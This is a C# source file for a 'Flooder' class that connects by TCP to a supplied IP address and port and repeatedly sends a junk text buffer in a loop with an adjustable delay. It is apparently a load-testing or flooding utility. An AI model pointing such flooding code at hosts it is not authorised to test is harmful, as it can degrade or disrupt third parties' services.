using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace FloodTest
{
    public class Flooder :IDisposable
    {
        public static long Count { get; private set; }

        public int Delay { get; set; } = 10;

        public IPAddress IpAddress { get; }
        public int Port { get; }

        private IPEndPoint Host { get; }

        private Socket Socket { get; }

        private readonly byte[] buf;

        public bool IsFlooding { get; private set; }


        public Flooder(FloodConfig config):this(config.Ip,config.Port,config.NoDelay,config.Blocking, config.Delay) {}

        public Flooder(string ipAddress, int port): this(ipAddress,port, true, false, 10){}

        public Flooder(string ipAddress, int port, bool noDelay, bool blocking, int delay)
        {
            this.IpAddress = IPAddress.Parse(ipAddress);
            this.Port = port;
            this.Delay = delay;

            this.buf = Encoding.ASCII.GetBytes("data vjkdslsjdfhsdhflkjsdbhsdbifuaehiulrcewncWCEHNOUEWH EHUICNRIHAESIOFCNHAWOIU EFWHUIFCHNAXAUF HEWIUIFHASUOXFHASDFHLASEMFXJSA EWHUIXFJASDHFUASCNFMLXJEK LEHFLAMSLDALEH KUHEUSKFJBSDFJSD");

            this.Host = new IPEndPoint(this.IpAddress, this.Port);

            this.Socket = new Socket(this.Host.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
            {
                NoDelay = noDelay,
                Blocking = blocking
            };
        }

        public bool TryConnect(int timesToReconnect)
        {
            bool result = false;

            for (int i = 0; i < timesToReconnect; i++)
            {
                try
                {
                    this.Connect();

                    result = true;

                    break;
                }
                catch (Exception)
                {
                    Console.WriteLine($"Reconnecting... ({i + 1})");
                }
            }

            return result;
        }

        public void Connect()
        {
            this.Socket.Connect(this.Host);
        }

        public int Send() => 
            this.Socket.Send(this.buf);

        public void Stop()
        {
            this.IsFlooding = false;
        }

        public void Flood()
        {
            this.IsFlooding = true;

            while (this.IsFlooding)
            {
                this.Send();
                Count++;
                //Console.WriteLine($"{DateTime.Now} Packet sent {bytes}bytes");

                if (this.Delay > 0)
                    Thread.Sleep(this.Delay);
            }
        }

        public void Dispose()
        {
            this.Socket?.Dispose();
        }
    }
}